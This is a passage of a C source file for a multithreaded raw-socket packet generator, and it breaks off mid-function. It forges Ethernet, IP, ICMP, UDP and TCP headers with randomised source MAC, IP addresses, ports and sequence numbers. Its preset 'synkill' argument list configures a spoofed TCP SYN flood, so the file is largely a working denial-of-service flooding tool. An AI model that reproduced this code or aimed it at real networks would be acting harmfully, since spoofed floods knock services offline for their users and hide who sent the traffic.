/****************************************************************
 *	GNU General Public License Version 3 or later (GPL3+)	*
 *		https://www.gnu.org/licenses/gpl-3.0.txt	*
 ****************************************************************/
#define _GNU_SOURCE
char license[]={
#ifdef LICENSE_BIN
#include "license_bin"
	,'\n',0x00
#else 
	"https://www.gnu.org/licenses/gpl-3.0.txt\n"
#endif
};
#include <sys/syscall.h>
#include <linux/futex.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ether.h>
#include <linux/icmp.h>
#include <linux/tcp.h>
#include <unistd.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <sys/wait.h>
#include <sched.h>
#include <sys/select.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/epoll.h>
//#define RELEASE
//#define USE_EPOLL_PWAIT2 //suggested if your kernel version>=5.11
#define ERR_LSEEK ((off_t)-1)
#define waitf(uaddr,val) syscall(SYS_futex,uaddr,FUTEX_WAIT,val,NULL,NULL,0)
//#define waitf(uaddr,val) (-1)
//#define wakef(uaddr,val) (-1)
#define wakef(uaddr,val) syscall(SYS_futex,uaddr,FUTEX_WAKE,val,NULL,NULL,0)
#define MAX_NPROCESS 16
#define MAX_HIDDEN_ERRORS 128
#define TSTACK_SIZE 8192
#define INPUT_SIZE 1024
struct argandret{
	long id,tid;
	unsigned long sent,sent_ok,sent_size,aborted,nerror;
	long end;
	uint32_t mutex;
	struct in_addr ip_src,ip_dst;
	char mac_src[ETH_ALEN],mac_dst[ETH_ALEN];
	uint32_t tcp_seq;
	uint16_t icmp_seqn,icmp_idn,port_dst,port_src,ip_id,tcp_window;
};
struct pseudohdr{
	struct in_addr saddr;
	struct in_addr daddr;
	uint8_t zero;
	uint8_t protocol;
	__be16 len;
};
enum {TYPE_AUTO,TYPE_RAW,TYPE_DGRAM} icmp_sock_type=TYPE_AUTO;
enum {CHECK_AUTO,CHECK_SELECT,CHECK_EPOLL,CHECK_NO,CHECK_NONE} check_mode=CHECK_NONE;
enum __proto {P_NONE,P_RAW,P_ETHER,P_IP,P_IP6,P_ICMP,P_ICMP6,P_UDP,P_TCP} base_proto=P_NONE;
enum __proto upper_proto=P_ICMP;
struct timespec ts;
//int sock_domain,sock_protocol;
/*packet option
uint16_t icmp_seq0=0,icmp_type=ICMP_ECHO,icmp_echoid=0;
uint16_t port_t=0,port_s=0,eth_proto=0;
struct in_addr ip_addr_t,ip_addr_s;
char mac_s[ETH_ALEN],mac_s_c=0,mac_t[ETH_ALEN],mac_t_c=0,ip_ttl=64,ip_tlen;

end packet option*/
char sleep_between_sents=0,running,count_written=0,update_ok=1,recv_pack=0,epet=0;
char *target=NULL,*source=NULL,*bind_device=NULL,*data_from_file=NULL,*tstack;
size_t packlen,data_size=0,sent_sum=0,sent_sum_ok=0,count=0,sent_sum_size=0,aborted_sum=0,nerror_sum=0,sndbuf=0,nnetdown=0,nnetunreach=0;
void (*phdr[MAX_NPROCESS])(void *s,size_t offset,struct argandret *aar);
size_t (*fhdr[MAX_NPROCESS])(void *s,size_t offset,struct argandret *aar);
size_t offsets[MAX_NPROCESS];
char read_stdin_stack[TSTACK_SIZE];
char input[INPUT_SIZE];//read_stdin
char input1[INPUT_SIZE];//main
char source_buf[INPUT_SIZE];//main
char input2[INPUT_SIZE];//read_stdin
char lastcmd[INPUT_SIZE];
int hidden_errors[MAX_HIDDEN_ERRORS];
long nhidden_errors=0;
long nthreads=1,cthreads,rthreads=0;
struct argandret *targ;
int pid,ctout=-1;
volatile uint32_t smutex=0;
unsigned int do_alarm=0;
pthread_mutex_t gmutex;
struct timespec cts;
//struct timeval ctv;
struct timespec *pcts=NULL;
//struct timeval *pctv=NULL;
char ifname[IFNAMSIZ];
char *synkill_args[]={"synkill","--mac-src-rand","--ip-src-rand","--src-port-rand","-ET","--tcp-flag","s","--ip-id-rand","--tcp-window-rand",NULL};
//#define epoll_create(x) (-1)
//#define epoll_ctl(x,y,z,t) (-1)
//#define clone(x,y,z,t) (-1)
//#define malloc(x) NULL
#define ARP_PATH "/proc/net/arp"
int localip(const char *restrict ifname,struct in_addr *restrict ip){
	struct ifreq ir;
	int fd,i;
	fd=socket(AF_INET,SOCK_DGRAM,0);
	if(fd<0)return -errno;
	memset(&ir,0,sizeof(ir));
	ir.ifr_addr.sa_family=AF_INET;
	strcpy(ir.ifr_name,ifname);
	if(ioctl(fd,SIOCGIFADDR,&ir)<0){
		i=errno;
		close(fd);
		return -i;
	}
	memcpy(ip,&((struct sockaddr_in *)&ir.ifr_addr)->sin_addr,sizeof(struct in_addr));
	close(fd);
	return 1;
}
int localnetmask(const char *restrict ifname,struct in_addr *restrict ip){
	struct ifreq ir;
	int fd,i;
	fd=socket(AF_INET,SOCK_DGRAM,0);
	if(fd<0)return -errno;
	memset(&ir,0,sizeof(ir));
	ir.ifr_addr.sa_family=AF_INET;
	strcpy(ir.ifr_name,ifname);
	if(ioctl(fd,SIOCGIFNETMASK,&ir)<0){
		i=errno;
		close(fd);
		return -i;
	}
	memcpy(ip,&((struct sockaddr_in *)&ir.ifr_addr)->sin_addr,sizeof(struct in_addr));
	close(fd);
	return 1;
}
int localmac(const char *restrict ifname,uint8_t *restrict mac){
	struct ifreq ir;
	int fd,i;
	fd=socket(AF_INET,SOCK_DGRAM,0);
	if(fd<0)return -errno;
	memset(&ir,0,sizeof(ir));
	ir.ifr_addr.sa_family=AF_INET;
	strcpy(ir.ifr_name,ifname);
	if(ioctl(fd,SIOCGIFHWADDR,&ir)<0){
		i=errno;
		close(fd);
		return -i;
	}
	memcpy(mac,ir.ifr_addr.sa_data,ETH_ALEN);
	close(fd);
	return 1;
}
int ip2mac(const char *restrict ifname,const struct in_addr *restrict ip,uint8_t *restrict mac){
	int fd,i;
	struct arpreq ar;
	struct in_addr in;
	if((i=localip(ifname,&in))<0)return i;
	if(memcmp(ip,&in,sizeof(in))==0){
		return localmac(ifname,mac);
	}
//read arp cache
	fd=socket(AF_INET,SOCK_DGRAM,0);
	if(fd<0)return -errno;
	memset(&ar,0,sizeof(ar));
	strcpy(ar.arp_dev,ifname);
	ar.arp_pa.sa_family=AF_INET;
	memcpy(&((struct sockaddr_in *)&ar.arp_pa)->sin_addr,ip,sizeof(struct in_addr));
	if(ioctl(fd,SIOCGARP,&ar)<0){
		i=errno;
		close(fd);
		return -i;
	}
	memcpy(mac,ar.arp_ha.sa_data,ETH_ALEN);
	close(fd);
	return 1;

/*
readarp:
	fd=open(ARP_PATH,O_RDONLY);
	if(fd<0)return -errno;
	bufsiz=INPUT_SIZE;
	if((buf=malloc(INPUT_SIZE))==NULL)return -errno;
	memset(buf,0,INPUT_SIZE);
	while((r=read(fd,buf+bufsiz-INPUT_SIZE,INPUT_SIZE))==INPUT_SIZE){
	bufsiz+=INPUT_SIZE;
	if((buf=realloc(buf,bufsiz))==NULL){
		i=errno;
		close(fd);
		free(buf);
		return -i;
	}
	memset(buf+bufsiz-INPUT_SIZE,0,INPUT_SIZE);
	}
	close(fd);
	i=0;
	p=buf;
	p=strchr(p,'\n');
	*p++=0;
	p=strtok_r(p," \t\n",&stbuf);
	while(p){
		if(strcmp(ascip,p)==0){
			if(strtok_r(NULL," \t\n",&stbuf)==NULL){free(buf);return 0;}
			if(strtok_r(NULL," \t\n",&stbuf)==NULL){free(buf);return 0;}
			if((p=strtok_r(NULL," \t\n",&stbuf))==NULL){free(buf);return 0;}
			strcpy(ascmac,p);
			if(strtok_r(NULL," \t\n",&stbuf)==NULL){free(buf);return 1;}
			if((p=strtok_r(NULL," \t\n",&stbuf))==NULL){free(buf);return 1;}
			if(bind_device&&strcmp(p,bind_device)!=0){
			if((p=strtok_r(NULL," \t\n",&stbuf))==NULL){free(buf);return 0;}
				continue;
			}
			if(!bind_device)strcpy(ascif,p);
			free(buf);
			return 2;
//			strtok_r(NULL," \t\n",&stbuf);

		}else{
			for(i=0;i<6;++i){
			if((p=strtok_r(NULL," \t\n",&stbuf))==NULL){free(buf);return 0;}
			}
		}
	}
	free(buf);
	return 0;*/
}
int ifname2index(int fd,const char *restrict name){
	struct ifreq ir;
	int r0;
	memset(&ir,0,sizeof(ir));
	strcpy(ir.ifr_name,name);
	r0=ioctl(fd,SIOCGIFINDEX,&ir);
	if(r0<0){
		return -errno;
	}else{
		return ir.ifr_ifindex;
	}
}
const char *bfname(const char *path){
	if(path[0]=='/'&&path[1]=='\0')return path;
	path=strrchr(path,'/');
	return path+1;
}
int dat2spec(const char *restrict a,struct timespec *restrict spec){
	unsigned long i,n,r0;
	i=0;n=0;
	while(*a){
		if(*a<='9'&&*a>='0'){
			i=i*10+(*a-'0');
			++a;
		}else if(*a=='.'){
			break;
		}else return 0;
	}
	if(!*a){
	spec->tv_sec=i;
	spec->tv_nsec=0;
		return 1;
	}
	r0=1000000000l/10l;
	while(*++a){
		if(*a<='9'&&*a>='0'){
			n+=(*a-'0')*r0;
			r0/=10;
		}else return 0;
	}
	spec->tv_sec=i;
	spec->tv_nsec=n;
return 2;
}
char *b2hu(size_t byte,char *out){
	size_t n[5];
	size_t rate=40,i=0;
	if(byte==0){
		strcpy(out,"0B");
		return out;
	}
	while(i<5){
	//	printf("%ld\n",byte);
		n[i]=(byte>>rate);
		byte%=(1lu<<rate);
	//	printf("%ld\n",n[i]);
		rate-=10;
		++i;
	}
	sprintf(out,"%zuT %zuG %zuM %zuK %zuB",n[0],n[1],n[2],n[3],n[4]);
	i=0;
		while((out[i]<'1'||out[i]>'9')&&out[i])++i;
	return out+i;
}
uint16_t cksum(const void *s,size_t n){
	uint32_t sum=0;
	const uint16_t *p=(const uint16_t *)s;
	union {
		uint8_t c[2];
		uint16_t s;
	} v;
	while(n>1){
		sum+=*p++;
		n-=2;
	}
	if(n){
		v.c[0]=*p;
		v.c[1]=0;
		sum+=v.s;
	}
	return ~(uint16_t)((sum>>16)+(sum&0xffff));
}
uint32_t cksum_raw(const void *s,size_t n){
	uint32_t sum=0;
	const uint16_t *p=(const uint16_t *)s;
	union {
		uint8_t c[2];
		uint16_t s;
	} v;
	while(n>1){
		sum+=*p++;
		n-=2;
	}
	if(n){
		v.c[0]=*p;
		v.c[1]=0;
		sum+=v.s;
	}
	return sum;
}
int sockerr(int fd){
	socklen_t optlen;
	optlen=sizeof(fd);
	getsockopt(fd,SOL_SOCKET,SO_ERROR,&fd,&optlen);
	return fd;
}
int checksockfd(int fd,int epfd,int *errn){
	int r0;
	struct epoll_event ev;
	fd_set efds,wfds;
	if(epfd>=0){
#ifdef USE_EPOLL_PWAIT2
		if((r0=epoll_pwait2(epfd,&ev,1,pcts,NULL))<0){
#else
		if((r0=epoll_pwait(epfd,&ev,1,ctout,NULL))<0){
#endif
			*errn=errno;
			return -1;
		}
		else if(r0>0&&ev.events&EPOLLERR){
			*errn=sockerr(fd);
			return 1|(ev.events&EPOLLOUT?2:0);
		}else return 0;
	}
	//checking with epoll completed. now treat the case with select
	FD_ZERO(&wfds);
	FD_ZERO(&efds);
	FD_SET(fd,&wfds);
	FD_SET(fd,&efds);
	if((r0=pselect(fd+1,NULL,&wfds,&efds,pcts,NULL))<0){
		*errn=errno;
		return -1;
	}else if(r0>0&&FD_ISSET(fd,&efds)){
//		puts("efds");
		*errn=sockerr(fd);
		return 1;
	}else return 0;
}

void errexit(const char *msg){
	write(STDERR_FILENO,msg,strlen(msg));
	exit(1);
}
void memrand(void *restrict m,size_t n){
#if (RAND_MAX>=UINT32_MAX)
	while(n>=4){
		*(uint32_t *)m=(uint32_t)rand();
		*(char *)&m+=4;
		n-=4;
	}
#endif
#if (RAND_MAX>=UINT16_MAX)
	while(n>=2){
		*(uint16_t *)m=(uint16_t)rand();
		*(char *)&m+=2;
		n-=2;
	}
#endif
	while(n>0){
		*(uint8_t *)m=(uint8_t)rand();
		*(char *)&m+=1;
		--n;
	}

}
void memnot(void *restrict m,size_t n){
	while(n>=8){
		*(uint64_t *)m=~*(uint64_t *)m;
		*(char *)&m+=8;
		n-=8;
	}
	while(n>=4){
		*(uint32_t *)m=~*(uint32_t *)m;
		*(char *)&m+=4;
		n-=4;
	}
	while(n>=2){
		*(uint16_t *)m=~*(uint16_t *)m;
		*(char *)&m+=2;
		n-=2;
	}
	while(n>0){
		*(uint8_t *)m=~*(uint8_t *)m;
		*(char *)&m+=1;
		--n;
	}

}
void memand(void *restrict d,void *restrict s,size_t n){
	while(n>=8){
		*(uint64_t *)d&=*(uint64_t *)s;
		*(char *)&d+=8;
		*(char *)&s+=8;
		n-=8;
	}
	while(n>=4){
		*(uint32_t *)d&=*(uint32_t *)s;
		*(char *)&d+=4;
		*(char *)&s+=4;
		n-=4;
	}
	while(n>=2){
		*(uint16_t *)d&=*(uint16_t *)s;
		*(char *)&d+=2;
		*(char *)&s+=2;
		n-=2;
	}
	while(n>0){
		*(uint8_t *)d&=*(uint8_t *)s;
		*(char *)&d+=1;
		*(char *)&s+=1;
		--n;
	}

}
void memor(void *restrict d,void *restrict s,size_t n){
	while(n>=8){
		*(uint64_t *)d|=*(uint64_t *)s;
		*(char *)&d+=8;
		*(char *)&s+=8;
		n-=8;
	}
	while(n>=4){
		*(uint32_t *)d|=*(uint32_t *)s;
		*(char *)&d+=4;
		*(char *)&s+=4;
		n-=4;
	}
	while(n>=2){
		*(uint16_t *)d|=*(uint16_t *)s;
		*(char *)&d+=2;
		*(char *)&s+=2;
		n-=2;
	}
	while(n>0){
		*(uint8_t *)d|=*(uint8_t *)s;
		*(char *)&d+=1;
		*(char *)&s+=1;
		--n;
	}

}
void memxor(void *restrict d,void *restrict s,size_t n){
	while(n>=8){
		*(uint64_t *)d^=*(uint64_t *)s;
		*(char *)&d+=8;
		*(char *)&s+=8;
		n-=8;
	}
	while(n>=4){
		*(uint32_t *)d^=*(uint32_t *)s;
		*(char *)&d+=4;
		*(char *)&s+=4;
		n-=4;
	}
	while(n>=2){
		*(uint16_t *)d^=*(uint16_t *)s;
		*(char *)&d+=2;
		*(char *)&s+=2;
		n-=2;
	}
	while(n>0){
		*(uint8_t *)d^=*(uint8_t *)s;
		*(char *)&d+=1;
		*(char *)&s+=1;
		--n;
	}

}
enum vlmode {INC,RAND,DEC,FIX} icmp_seqmode=INC,icmp_idmode=FIX,ip_idmode=INC,port_srcmode=FIX,port_dstmode=FIX,tcp_seqmode=RAND,tcp_windowmode=FIX,mac_srcmode=FIX,ip_srcmode=FIX;
uint32_t tcp_seq=0;
uint16_t icmp_seq0=0,icmp_type=ICMP_ECHO,icmp_echoid=0;
uint16_t port_t=0,port_s=0,eth_protocol=0,ip_id=0,ip_tlen=0,tcp_window=512;
struct in_addr ip_addr_t,ip_addr_s,ip_mask,ip_masknot,ip_supernet;
uint8_t mac_s[ETH_ALEN],mac_s_c=0,mac_t[ETH_ALEN],mac_t_c=0,ip_addr_t_c=0,ip_addr_s_c=0,ip_ttl=IPDEFTTL,ip_protocol=0,icmp_seq_fillrand=0,icmp_id_fillrand=1,ip_id_fillrand=1,port_dst_fillrand=0,port_src_fillrand=1,tcp_seq_fillrand=0,ip_randmask=0;
char *tcp_flag;
size_t fill_icmphdr(void *s,size_t offset,struct argandret *aar){
	struct icmphdr *h;
	h=(struct icmphdr *)((char *)s+offset);
	h->type=icmp_type;
	if(icmp_seq_fillrand)memrand(&aar->icmp_seqn,sizeof(uint16_t));else
	aar->icmp_seqn=icmp_seq0;
	h->un.echo.sequence=htons(aar->icmp_seqn);
	if(icmp_id_fillrand)memrand(&aar->icmp_idn,sizeof(uint16_t));else
	aar->icmp_idn=icmp_echoid;
	h->un.echo.id=htons(aar->icmp_idn);
	return sizeof(*h);
}
size_t fill_ethhdr(void *s,size_t offset,struct argandret *aar){
	struct ethhdr *h;
	h=(struct ethhdr *)((char *)s+offset);
	memcpy(aar->mac_dst,mac_t,ETH_ALEN);
	memcpy(h->h_dest,aar->mac_dst,ETH_ALEN);

	memcpy(aar->mac_src,mac_s,ETH_ALEN);
	memcpy(h->h_source,aar->mac_src,ETH_ALEN);

	h->h_proto=htons(eth_protocol);
	return sizeof(struct ethhdr);
}
size_t fill_iphdr(void *s,size_t offset,struct argandret *aar){
	struct iphdr *h;
	h=(struct iphdr *)((char *)s+offset);
	h->version=4;
	h->ihl=sizeof(struct iphdr)/4;
	h->tos=0;
	h->tot_len=htons(ip_tlen);
	if(ip_id_fillrand)memrand(&aar->ip_id,sizeof(uint16_t));else
	aar->ip_id=ip_id;
	h->id=htons(aar->ip_id);
	h->frag_off|=htons(IP_DF);
	h->ttl=ip_ttl;
	h->protocol=ip_protocol;
	memcpy(&aar->ip_src,&ip_addr_s,sizeof(h->saddr));
	memcpy(&h->saddr,&aar->ip_src,sizeof(h->saddr));
	memcpy(&aar->ip_dst,&ip_addr_t,sizeof(h->daddr));
	memcpy(&h->daddr,&aar->ip_dst,sizeof(h->daddr));
	h->check=0;
	h->check=cksum(h,sizeof(*h));
	return sizeof(*h);
}
size_t fill_tcphdr(void *s,size_t offset,struct argandret *aar){
	struct tcphdr *h;
	char *p;
	h=(struct tcphdr *)((char *)s+offset);
	if(port_src_fillrand)memrand(&aar->port_src,sizeof(uint16_t));else
		aar->port_src=port_s;
	h->source=htons(aar->port_src);
	if(port_dst_fillrand)memrand(&aar->port_dst,sizeof(uint16_t));else
		aar->port_dst=port_t;
	h->dest=htons(aar->port_dst);
	h->doff=sizeof(struct tcphdr)/4;
	aar->tcp_window=tcp_window;
	h->window=htons(aar->tcp_window);
	p=tcp_flag;
	while(p&&*p){
		switch(*p|32){
		case 's':
			h->syn=1;
			break;
		case 'f':
			h->fin=1;
			break;
		case 'r':
			h->rst=1;
			break;
		case 'p':
			h->psh=1;
			break;
		case 'a':
			h->ack=1;
			break;
		case 'u':
			h->urg=1;
			break;
		default:
			break;
	}
	++p;
	}
	if(tcp_seq_fillrand)memrand(&aar->tcp_seq,sizeof(uint32_t));else
		aar->tcp_seq=tcp_seq;
	h->seq=htonl(aar->tcp_seq);

	return sizeof(*h);
}
void process_tcphdr(void *s,size_t offset,struct argandret *aar){
	struct tcphdr *h;
	struct pseudohdr ph;
	uint32_t cr;
//	char *p;
	h=(struct tcphdr *)((char *)s+offset);
	switch(port_srcmode){
		case RAND:
			memrand(&aar->port_src,sizeof(uint16_t));
			break;
		case FIX:
			break;
		case INC:
			++aar->port_src;
			break;
		case DEC:
			--aar->port_src;
			break;
		default:
			break;
	}
	h->source=htons(aar->port_src);
	switch(port_dstmode){
		case RAND:
			memrand(&aar->port_dst,sizeof(uint16_t));
			break;
		case FIX:
			break;
		case INC:
			++aar->port_dst;
			break;
		case DEC:
			--aar->port_dst;
			break;
		default:
			break;
	}
	h->dest=htons(aar->port_dst);
	switch(tcp_seqmode){
		case RAND:
			memrand(&aar->tcp_seq,sizeof(uint32_t));
			break;
		case FIX:
			break;
		case INC:
			++aar->tcp_seq;
			break;
		case DEC:
			--aar->tcp_seq;
			break;
		default:
			break;
	}
	h->seq=htonl(aar->tcp_seq);
	switch(tcp_windowmode){
		case RAND:
			memrand(&aar->tcp_window,sizeof(uint16_t));
			break;
		case FIX:
			break;
		case INC:
			++aar->tcp_window;
			break;
		case DEC:
			--aar->tcp_window;
			break;
		default:
			break;
	}
	h->window=htons(aar->tcp_window);

	memcpy(&ph.saddr,&aar->ip_src,sizeof(struct in_addr));
	memcpy(&ph.daddr,&aar->ip_dst,sizeof(struct in_addr));
	ph.protocol=IPPROTO_TCP;
	ph.zero=0;
	ph.len=htons(sizeof(*h)+data_size);
	h->check=0;
	cr=cksum_raw(h,sizeof(*h)+data_size)+cksum_raw(&ph,sizeof(ph));
	cr=(cr>>16)+(cr&0xffff);
	h->check=~(uint16_t)cr;
}
void process_ethhdr(void *s,size_t offset,struct argandret *aar){
	struct ethhdr *h;
	h=(struct ethhdr *)((char *)s+offset);
	switch(mac_srcmode){
		case RAND:
			memrand(aar->mac_src,ETH_ALEN);
			break;
		default:
			break;
	}
	memcpy(h->h_source,aar->mac_src,ETH_ALEN);
}
void process_iphdr(void *s,size_t offset,struct argandret *aar){
	struct iphdr *h;
	h=(struct iphdr *)((char *)s+offset);
	switch(ip_idmode){
		case RAND:
			memrand(&aar->ip_id,sizeof(uint16_t));
			break;
		case FIX:
			break;
		case INC:
			++aar->ip_id;
			break;
		case DEC:
			--aar->ip_id;
			break;
		default:
			break;
	}
	h->id=htons(aar->ip_id);
	switch(ip_srcmode){
		case RAND:
			memrand(&aar->ip_src,sizeof(struct in_addr));
			if(ip_randmask){
				memand(&aar->ip_src,&ip_masknot,sizeof(struct in_addr));
				memor(&aar->ip_src,&ip_supernet,sizeof(struct in_addr));
			}
			break;
		default:
			break;
	}
	memcpy(&h->saddr,&aar->ip_src,sizeof(struct in_addr));
	h->check=0;
	h->check=cksum(h,sizeof(*h));

}
void process_icmphdr(void *s,size_t offset,struct argandret *aar){
	struct icmphdr *h;
	h=(struct icmphdr *)((char *)s+offset);
	switch(icmp_seqmode){
		case RAND:
			memrand(&aar->icmp_seqn,sizeof(uint16_t));
			break;
		case FIX:
			break;
		case INC:
			++aar->icmp_seqn;
			break;
		case DEC:
			--aar->icmp_seqn;
			break;
		default:
			break;
	}
	switch(icmp_idmode){
		case RAND:
			memrand(&aar->icmp_idn,sizeof(uint16_t));
			break;
		case FIX:
			break;
		case INC:
			++aar->icmp_idn;
			break;
		case DEC:
			--aar->icmp_idn;
			break;
		default:
			break;
	}
	h->un.echo.sequence=htons(aar->icmp_seqn);
	h->un.echo.id=htons(aar->icmp_idn);
	h->checksum=0;
	h->checksum=cksum(h,sizeof(*h));
}
size_t fill_all(void *s,void *aar){
	size_t ret,i;
	ret=0;
	i=0;
	while(fhdr[i]){
	offsets[i]=ret;
	ret+=fhdr[i](s,ret,(struct argandret *)aar);
	++i;
	}
	if(data_size>0&&data_from_file){
		memcpy((char *)s+ret,data_from_file,data_size);
		ret+=data_size;
	}
	return ret;
}
void proc_all(void *s,void *aar){
	size_t i;
	i=0;
	while(phdr[i]){
	phdr[i](s,offsets[i],(struct argandret *)aar);
	++i;
	}
}

int newerr(int errn){
	long r0;
	pthread_mutex_lock(&gmutex);
	for(r0=0;r0<nhidden_errors;++r0){
		if(hidden_errors[r0]==errn){
			pthread_mutex_unlock(&gmutex);
			return 0;
		}
	}
	if(nhidden_errors>=MAX_HIDDEN_ERRORS)
	{
		nhidden_errors=0;
	}
	hidden_errors[nhidden_errors]=errn;
	++nhidden_errors;
	pthread_mutex_unlock(&gmutex);
	return errn;
}

int writing(void *arg){
union {
	struct sockaddr a;
	struct sockaddr_in in;
	struct sockaddr_ll ll;
} uaddr;
struct argandret *aar;
void *sbuf;
struct timespec ts_old,ts_new,ts_use;
struct epoll_event epevent;
ssize_t r;
socklen_t rs;
char inputp[INPUT_SIZE];
long id;
int fd,lasterr=0,r0,r1,epfd,r2;
aar=(struct argandret *)arg;
memset(&uaddr,0,sizeof(uaddr));
id=((struct argandret *)arg)->id;
switch(base_proto){
	case P_ICMP:
		uaddr.a.sa_family=AF_INET;
		memcpy(&uaddr.in.sin_addr,&ip_addr_t,sizeof(ip_addr_t));
		if(icmp_sock_type==TYPE_AUTO){
			fd=socket(AF_INET,SOCK_RAW,IPPROTO_ICMP);
			if(fd<0){
			fd=socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP);
			if(fd<0){
			if((r0=newerr(errno))){
			r1=sprintf(inputp,"%ld: SOCK_DGRAM(ICMP):%s (same errors following will be hidden)\n",id,strerror(r0));
			write(STDERR_FILENO,inputp,r1);
			}
			goto err1;
			}
		}
		}else if(icmp_sock_type==TYPE_RAW){
			fd=socket(AF_INET,SOCK_RAW,IPPROTO_ICMP);
			if(fd<0){
				if((r0=newerr(errno))){
				r1=sprintf(inputp,"%ld: SOCK_RAW:%s (same errors following will be hidden)\n",id,strerror(r0));
				write(STDERR_FILENO,inputp,r1);
				}
				goto err1;
			}
		}else if(icmp_sock_type==TYPE_DGRAM){
			fd=socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP);
			if(fd<0){
				if((r0=newerr(errno))){
				r1=sprintf(inputp,"%ld: SOCK_DGRAM(ICMP):%s (same errors following will be hidden)\n",id,strerror(r0));
				write(STDERR_FILENO,inputp,r1);
				}
				goto err1;
			}
		}
		if(bind_device){
			if(setsockopt(fd,SOL_SOCKET,SO_BINDTODEVICE,bind_device,strlen(bind_device)+1)<0){
		if((r0=newerr(errno))){
		r1=sprintf(inputp,"%ld: cannot bind device:%s (same errors following will be hidden)\n",id,strerror(r0));
		write(STDERR_FILENO,inputp,r1);
		}
		goto err2;
		}
	}
		fcntl(fd,F_SETFL,fcntl(fd,F_GETFL)|O_NONBLOCK);
		if(connect(fd,&uaddr.a,sizeof(uaddr.in))<0){
			if((r0=newerr(errno))){
			r1=sprintf(inputp,"%ld: connect:%s (same errors following will be hidden)\n",id,strerror(r0));
			write(STDERR_FILENO,inputp,r1);
			}
			goto err2;
		}
		break;
	case P_UDP:
		uaddr.a.sa_family=AF_INET;
		memcpy(&uaddr.in.sin_addr,&ip_addr_t,sizeof(ip_addr_t));
		uaddr.in.sin_port=htons(port_t);
			fd=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
			if(fd<0){
				if((r0=newerr(errno))){
				r1=sprintf(inputp,"%ld: SOCK_DGRAM:%s (same errors following will be hidden)\n",id,strerror(r0));
				write(STDERR_FILENO,inputp,r1);
				}
				goto err1;
			}
		if(bind_device){
			if(setsockopt(fd,SOL_SOCKET,SO_BINDTODEVICE,bind_device,strlen(bind_device)+1)<0){
		if((r0=newerr(errno))){
		r1=sprintf(inputp,"%ld: cannot bind device:%s (same errors following will be hidden)\n",id,strerror(r0));
		write(STDERR_FILENO,inputp,r1);
		}
		goto err2;
		}
	}
		fcntl(fd,F_SETFL,fcntl(fd,F_GETFL)|O_NONBLOCK);
		if(connect(fd,&uaddr.a,sizeof(uaddr.in))<0){
			if((r0=newerr(errno))){
			r1=sprintf(inputp,"%ld: connect:%s (same errors following will be hidden)\n",id,strerror(r0));
			write(STDERR_FILENO,inputp,r1);
			}
			goto err2;
		}
		break;

	default:
	fd=socket(AF_PACKET,SOCK_RAW,0);
	if(fd<0){
		r0=errno;
		r1=sprintf(inputp,"%ld: SOCK_RAW:%s\n",id,strerror(r0));
		write(STDERR_FILENO,inputp,r1);
		goto err1;
	}
	fcntl(fd,F_SETFL,fcntl(fd,F_GETFL)|O_NONBLOCK);
	uaddr.ll.sll_family=AF_PACKET;
//	uaddr.ll.sll_protocol=htons(ETH_P_ALL);
		r0=ifname2index(fd,bind_device?bind_device:ifname);
		if(r0<0){
		r1=sprintf(inputp,"%ld: cannot find device (%s):%s \n",id,bind_device,strerror(-r0));
		write(STDERR_FILENO,inputp,r1);
		goto err2;
		}
		uaddr.ll.sll_ifindex=r0;
//	uaddr.ll.sll_hatype=ARPHRD_NETROM;
//	uaddr.ll.sll_pkttype=PACKET_HOST;
//	uaddr.ll.sll_halen=0;
	if(bind(fd,(struct sockaddr *)&uaddr,sizeof(uaddr.ll))<0){
	if((r0=newerr(errno))){
	r1=sprintf(inputp,"%ld: cannot bind :%s (same errors following will be hidden)\n",id,strerror(r0));
	write(STDERR_FILENO,inputp,r1);
	}
	goto err2;
	}
}
pthread_mutex_lock(&gmutex);
sbuf=malloc(packlen);
if(sbuf==NULL){
	if((r0=newerr(errno)))goto malloc_err;
	r1=sprintf(inputp,"%ld: cannot malloc:%s (same errors following will be hidden)\n",id,strerror(r0));
	write(STDERR_FILENO,inputp,r1);
	goto malloc_err;
}//malloced
goto malloc_ok;
malloc_err:
pthread_mutex_unlock(&gmutex);
goto err2;
malloc_ok:
ts_old.tv_sec=0;
ts_old.tv_nsec=0;
++rthreads;
pthread_mutex_unlock(&gmutex);
if(sndbuf){
	rs=(socklen_t)(sndbuf/2+sndbuf%2);
	r0=setsockopt(fd,SOL_SOCKET,SO_SNDBUFFORCE,&rs,sizeof(rs));
	if(r0<0)r0=setsockopt(fd,SOL_SOCKET,SO_SNDBUF,&rs,sizeof(rs));
	if(r0<0){
		if((r0=newerr(errno))){
	r1=sprintf(inputp,"%ld: cannot set sendbuf:%s (same errors following will be hidden)\n",id,strerror(r0));
	write(STDERR_FILENO,inputp,r1);
	}
	goto err2;
	}
	r1=sizeof(rs);
	r0=getsockopt(fd,SOL_SOCKET,SO_SNDBUF,&rs,(socklen_t *)&r1);
	if(rs!=sndbuf){
	r1=sprintf(inputp,"%ld: sendbuf adjusted (by kernel) to %zu %s\n",id,(size_t)rs,r0<0?"???":"");
	write(STDERR_FILENO,inputp,r1);
	}
}
memset(sbuf,0,packlen);
fill_all(sbuf,arg);
//fprintf(stderr,"%ld: ready,d=%d\n",id,smutex);
//pthread_mutex_lock(&smutex);
//pthread_mutex_unlock(&smutex);
//fprintf(stderr,"%ld: started\n",id);
//start sending
//ioctl(fd,FIONBIO,"\1");
if(check_mode==CHECK_AUTO||check_mode==CHECK_EPOLL){
	epfd=epoll_create(1);
	if(epfd<0&&check_mode==CHECK_EPOLL){
		if((r0=newerr(errno))){
		r1=sprintf(inputp,"%ld: cannot create epoll:%s (same errors following will be hidden)\n",id,strerror(r0));
		write(STDERR_FILENO,inputp,r1);
		}
		goto err3;
	}
}
else epfd=-1;
if(epfd>=0){
epevent.events=EPOLLOUT|EPOLLERR|(epet?EPOLLET:0);
epevent.data.fd=0;
if(epoll_ctl(epfd,EPOLL_CTL_ADD,fd,&epevent)<0){
	if(check_mode==CHECK_EPOLL){
	if((r0=newerr(errno))){
	r1=sprintf(inputp,"%ld: cannot ctl epoll:%s (same errors following will be hidden)\n",id,strerror(r0));
	write(STDERR_FILENO,inputp,r1);
	}
	goto err4;
	}
	close(epfd);
	epfd=-1;
}
}
